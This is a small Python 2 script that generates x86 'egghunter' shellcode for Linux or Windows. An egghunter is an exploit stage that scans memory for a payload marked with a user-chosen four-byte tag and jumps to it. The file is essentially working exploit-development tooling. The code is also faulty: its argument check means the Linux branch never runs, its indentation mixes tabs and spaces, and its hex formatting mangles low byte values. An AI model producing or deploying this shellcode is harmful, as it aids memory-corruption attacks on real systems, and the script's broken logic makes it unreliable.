import sys
import struct

if (len(sys.argv) < 3):
	print "Use script like: python "+sys.argv[0]+" word ARCH"
        print "Example: python "+sys.argv[0]+" Woot 1"
        print "Archs:\n -----> 0: Linux\n -----> 1: Windows"
        sys.exit(1) 

if ( not sys.argv[2] ): # linux
        print("EggHunter fct opcodes for Linux:")
	egghunter = "\\x31\\xc9\\xeb\\x05\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xf1\\xb8"
	for i in range(0,4):
		egghunter += "\\x"+hex(ord(sys.argv[1][i])).replace('0x',"")

	egghunter += "\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7"
	print egghunter

if ( sys.argv[2]): # windows
        print("EggHunter fct opcodes for Windows:")
	egghunter = "\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8"
	for i in range(0,4):
		egghunter += "\\x"+hex(ord(sys.argv[1][i])).replace('0x',"")

	egghunter += "\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7"
	print egghunter
